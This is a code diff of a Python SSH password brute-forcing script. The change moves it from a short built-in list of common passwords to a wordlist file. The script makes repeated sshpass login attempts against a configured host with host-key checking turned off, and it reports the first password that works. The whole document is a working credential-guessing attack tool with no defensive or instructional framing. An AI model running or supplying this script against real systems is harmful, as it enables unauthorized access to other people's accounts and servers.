@@ -4,43 +4,34 @@ import time
 from config import SSH_HOST, SSH_PORT, SSH_USER
 
 
-PASSWORDS = [
-    "123456",
-    "password",
-    "admin",
-    "root",
-    "qwerty",
-    "letmein",
-    "welcome",
-    "123123",
-    "password1",
-    "test123",
-    "hunter2",
-    "letter"
-]
+with open("wordlists/passwords.txt", "r") as file:
+    for password in file:
+        password = password.strip()
 
-for password in PASSWORDS:
-    print(f"Trying: {password}")
+        if not password:
+            continue
 
-    result = subprocess.run(
-        [
-            "sshpass",
-            "-p", password,
-            "ssh",
-            "-p", str(SSH_PORT),
-            "-o", "StrictHostKeyChecking=no",
-            "-o", "UserKnownHostsFile=/dev/null",
-            f"{SSH_USER}@{SSH_HOST}",
-            "echo Connected"
-        ],
-        capture_output=True,
-        text=True
-    )
+        print(f"Trying: {password}")
 
-    print("Exit code:", result.returncode)
+        result = subprocess.run(
+            [
+                "sshpass",
+                "-p", password,
+                "ssh",
+                "-p", str(SSH_PORT),
+                "-o", "StrictHostKeyChecking=no",
+                "-o", "UserKnownHostsFile=/dev/null",
+                f"{SSH_USER}@{SSH_HOST}",
+                "echo Connected"
+            ],
+            capture_output=True,
+            text=True
+        )
 
-    if result.returncode == 0:
-        print(f"[+] Password found: {password}")
-        break
+        print("Exit code:", result.returncode)
 
-    time.sleep(0.3)
+        if result.returncode == 0:
+            print(f"[+] Password found: {password}")
+            break
+
+        time.sleep(0.3)
